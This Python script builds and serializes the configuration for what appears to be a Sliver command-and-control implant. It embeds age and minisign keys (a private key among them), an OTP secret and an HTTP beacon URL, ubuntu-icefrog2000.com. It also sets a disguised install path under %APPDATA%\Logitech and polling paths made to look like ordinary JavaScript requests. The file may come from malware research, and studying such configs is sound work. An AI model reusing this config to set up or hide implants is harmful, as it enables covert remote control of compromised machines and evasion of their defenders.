from protobuf import config_pb2

# message DriveConfig {
#     string ClientID = 1;
#     string ClientSecret = 2;
#     string RefreshToken = 3;
#     string UserAgent = 4;
#     string StartExtension = 5;
#     string SendExtension = 6;
#     string RecvExtension = 7;
#     string RegisterExtension = 8;
#     uint32 PollInterval = 9;
# }

# message HttpConfig {
#     repeated string PollPaths = 1;
#     repeated string PollFiles = 2;
#     repeated string SessionPaths = 3;
#     repeated string SessionFiles = 4;
#     repeated string ClosePaths = 5;
#     repeated string CloseFiles = 6;
#     string UserAgent = 7;
#     string OtpSecret = 8;
#     uint32 OtpInterval = 9;
#     uint32 MinNumberOfSegments = 10;
#     uint32 MaxNumberOfSegments = 11;
#     uint32 PollInterval = 12;
#     bool UserStandardPort = 13;
#     string URL = 14;
# }

# message PivotConfig {
#     string BindAddress = 1;
#     uint32 ReadDeadline = 2;
#     uint32 WriteDeadline = 3;
# }

# message Config {
#     string ServerPublicKey = 1;
#     string PeerPublicKey = 2;
#     string PeerPrivateKey = 3;
#     string ServerMinisignPublicKey = 4;
#     string SliverName = 5;
#     string ConfigID = 6;
#     string PeerAgePublicKeySignature = 7;
#     uint64 EncoderNonce = 8;
#     uint32 MaxFailure = 9;
#     uint64 ReconnectInterval = 10;
#     string SliverPath = 11;
#     ProtocolType Protocol = 12;
#     ImplantType Type = 13;
#     repeated DriveConfig DriveConfigs = 14;
#     repeated HttpConfig HttpConfigs = 15;
#     repeated PivotConfig PivotConfigs = 16;
# }

config = config_pb2.Config()
config.ServerPublicKey = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl"
config.PeerPublicKey = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken"
config.PeerPrivateKey = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7"
config.ServerMinisignPublicKey = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2"
config.SliverName = "DECISIVE_FERRY"
config.ConfigID = "9ecd4772-22ed-428d-be07-a2579092f740"
config.PeerAgePublicKeySignature = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ=="
config.EncoderNonce = 13
config.MaxFailure = 5
config.ReconnectInterval = 600
config.SliverPath = "%APPDATA%\\Logitech"
config.Protocol = config_pb2.ProtocolType.HTTP
config.Type = config_pb2.ImplantType.Session
http_config = config.HttpConfigs.add()
poll_paths = ["script", "javascripts", "javascript", "jscript", "js", "umd"]
poll_files = ["jquery", "route", "app"]
session_paths = ["upload", "actions"]
session_files = ["samples", "api"]
close_paths = ["assets", "images"]
close_files = ["example", "favicon"]
for i in poll_paths:
    http_config.PollPaths.append(i)

for i in poll_files:
    http_config.PollFiles.append(i)

for i in session_paths:
    http_config.SessionPaths.append(i)

for i in session_files:
    http_config.SessionFiles.append(i)

for i in close_paths:
    http_config.ClosePaths.append(i)

for i in close_files:
    http_config.CloseFiles.append(i)

http_config.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36"
http_config.OtpSecret = "GQH4RBUBSOLX446N2CBCS7AYHYLBMA2A"
http_config.OtpInterval = 30
http_config.MinNumberOfSegments = 2
http_config.MaxNumberOfSegments = 4
http_config.PollInterval = 3
http_config.UseStandardPort = True
http_config.URL = "http://ubuntu-icefrog2000.com"

marshaled_data = config.SerializeToString()
print(marshaled_data)